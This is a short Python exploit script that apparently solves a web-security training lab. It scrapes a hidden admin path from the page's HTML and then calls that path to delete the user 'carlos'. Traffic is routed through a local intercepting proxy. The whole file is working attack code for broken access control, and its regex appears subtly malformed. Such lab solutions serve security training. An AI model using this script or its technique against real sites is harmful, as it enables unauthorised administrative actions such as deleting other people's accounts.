import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def exploit_access_control(url):
    r1 = requests.get(url, verify=False, proxies=proxies)
    # Retrive session cookie
    session_cookie = r1.cookies.get_dict().get('session')

    # Retrive admin panel
    soup = BeautifulSoup(r1.text, 'lxml')
    admin_instances = soup.find(string=re.compile('/admin-'))

    admin_path = re.search("href'. '(.*)'", admin_instances).group(1)

    # Delete carlos

    cookies = {'session':session_cookie}
    delete_carlos_url = url+admin_path+'/delete?username=carlos'
    r2 = requests.get(delete_carlos_url, cookies=cookies, verify=False,proxies=proxies)
    if r2.status_code == 200:
        print("(+) Carlos deleted succussfully")
    else:
        print("(-) Error deleting Carlos")

    
    print(admin_path)
if __name__ == '__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print("Usage: python %s <url>" %sys.argv[0])
        print("Example: python %s example.com" %sys.argv[0])
        sys.exit(1)
    exploit_access_control(url)